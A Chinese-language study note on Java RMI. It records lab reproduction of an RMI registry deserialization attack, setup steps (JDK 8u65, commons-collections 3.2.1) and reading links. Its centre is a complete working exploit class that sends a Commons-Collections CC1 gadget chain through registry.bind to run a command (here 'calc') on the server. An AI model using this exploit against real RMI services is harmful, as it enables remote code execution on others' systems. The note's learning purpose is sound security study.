# RMI

## 前言

苦 RMI 久矣，我缺少一篇好的文章全面、细致地为我讲述 RMI，而且我觉得 RMI 这个机制真的很有用。我太爱远程调用某些资源了！

书读百遍，其意自现。纸上得来终觉浅，绝知此事要躬行。所以我的方法论是先看一些 RMI 文章，最后进行实操。

**推荐阅读（按序）**

1. https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html

记录一下关于阅读上述文章的复现

首先是jdk6u29的下载，下完之后记得改系统环境变量里面的path，这一点很重要。详情可以这篇[文章](https://blog.csdn.net/mnorst/article/details/6941194)。

~~之后是 payload 的编译问题，第一个复现我编译了四个类，具体那四个忘记了，反之测一下就明白。当然至关重要的是不要在 payload 同目录下运行 java，这样会提示找不到主类，具体我也不明白为什么，总之需要去到包名那个起始目录。~~

真的难受，无论怎么也找不到 main方法，后面在 vscode 里面编译居然成功了，vscode 永远的神！

**复现结果**

运行客户端、服务端之后成功弹出计算器。



## RMI攻击复现

### 环境搭建

1. 创建两个 idea 项目（不在同目录下），分别对应客户端和服务器
2. 运行服务器
3. 在客户端编写 payload 发送到服务器，这里要利用 maven 引入 CC 包依赖，记得重新构建一下
4. 复现失败，猜测 jdk 版本有问题，原作者没给出他的版本，我真的会谢...

- jdk 版本是 8u65

```xml
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
```



### bind() 和 readbind()

这两个方法最终会根据传入的远程对象调用 readObject() 方法，所以存在反序列化漏洞。exp 编写的核心思路也不复杂，已知最终会根据远程对象调用 readObject()，并且我们知道远程对象实际上是一个代理实例，所以可以在远程对象的调用处理器上着手。巧合的是，CC1 刚好就利用到了某个调用处理器类进行攻击，我们把 CC1 的 payload 搬过来直接用就好，不过要注意定义完代理类实例要转成 Remote 对象。

```java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.rmi.Remote;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import java.util.HashMap;  
import java.util.Map;  
  
public class AttackRegistryEXP {  
    public static void main(String[] args) throws Exception{  

        Registry registry = LocateRegistry.getRegistry(
            "127.0.0.1",
            1099
        );  
        InvocationHandler handler = (InvocationHandler) CC1();

        Remote remote = Remote.class.cast(Proxy.newProxyInstance(  
                Remote.class.getClassLoader(),
                new Class[] { Remote.class }, 
                handler)
            );  
        registry.bind("test",remote);  
 }  
  
    public static Object CC1() throws Exception{

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                    "getMethod",  
                    new Class[]{String.class, Class[].class}, 
                    new Object[]{"getRuntime", null}
                ),  
                new InvokerTransformer(
                    "invoke", 
                    new Class[]{Object.class, Object[].class}, 
                    new Object[]{null, null}
                ),  
                new InvokerTransformer(
                    "exec", 
                    new Class[]{String.class}, 
                    new Object[]{"calc"}
                )  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        hashMap.put("value","drunkbaby");  
        Map<Object, Object> transformedMap = TransformedMap.decorate(
            hashMap, 
            null, 
            chainedTransformer
        );  
        Class c = Class.forName(
            "sun.reflect.annotation.AnnotationInvocationHandler"
        );  
        Constructor aihConstructor = c.getDeclaredConstructor(
            Class.class, Map.class
        );  
        aihConstructor.setAccessible(true);  
        Object o = aihConstructor.newInstance(Target.class, transformedMap);  
        return o;  
 }  
}
```



## 推荐阅读

1. [Java远程方法调用(RMI) - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/135360489)

虽然啰嗦了一些，但是是对于官方rmi描述的汉化翻译，还是值得一看的。

2. [Java的RMI介绍及使用方法详解 | w3cschool笔记](https://www.w3cschool.cn/article/30445887.html)

这篇我看完了，感觉也挺不错，说的很简单。

3. 最后是 RMI 漏洞成因的[源码分析](https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/)

4. RMI的攻击方式[看看这个](https://github.com/Maskhe/javasec/blob/master/7.%E6%94%BB%E5%87%BBrmi%E7%9A%84%E6%96%B9%E5%BC%8F.md)
